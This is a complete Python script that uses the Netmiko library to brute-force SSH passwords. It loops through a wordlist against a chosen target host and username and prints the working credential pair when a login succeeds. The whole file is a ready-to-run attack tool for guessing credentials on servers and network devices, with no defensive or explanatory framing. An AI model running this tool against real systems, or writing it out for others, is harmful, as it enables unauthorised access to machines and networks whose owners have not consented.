
#!/usr/bin/python3.7
from netmiko import Netmiko
import argparse

msg_usage=" \n Usase: python3 sshbrute_netmiko.py -t <target> -d <device> [optional] -u <username>  -w <wordlist.txt>"
msg_target="Name or IP Address"
msg_word="File with list of possible password" 
msg_user="Account name" 
msg_device="Value default is Linux" 

option = argparse.ArgumentParser(description=msg_usage)
option.add_argument("-t","--target" ,  dest="target", help=msg_target)
option.add_argument("-u","--user" ,  dest="user", help=msg_user)
option.add_argument("-d","--device",default="linux",  dest="devicetype", help=msg_device, type=str)
option.add_argument("-w","--wordlist", dest="wordlist", help=msg_word)
option_args = option.parse_args()

if option_args.user == None:
    print(option.description)
    exit(0)

if option_args.target == None:
    print(option.description)
    exit(0)

if option_args.wordlist == None:
    print(option.description)
    exit(0)

username=str(option_args.user)
target=option_args.target
device=str(option_args.devicetype)
wordlist=option_args.wordlist

print("[*] - Please wait - Bruteforce attack running")
with open(wordlist, "r") as _word:
    for _line in _word:
        _password = _line.strip("\n")
        
        try:
            sshconn = Netmiko(
                target, 
                username=username, 
                password=_password, 
                device_type=device)

            sshconn.disconnect()
            print("[+] BINGO - Username: " + username + " and Password: " + _password )
            break
            
        except:
            print("[-] Fail - Username: " + username + " and Password: " + _password )



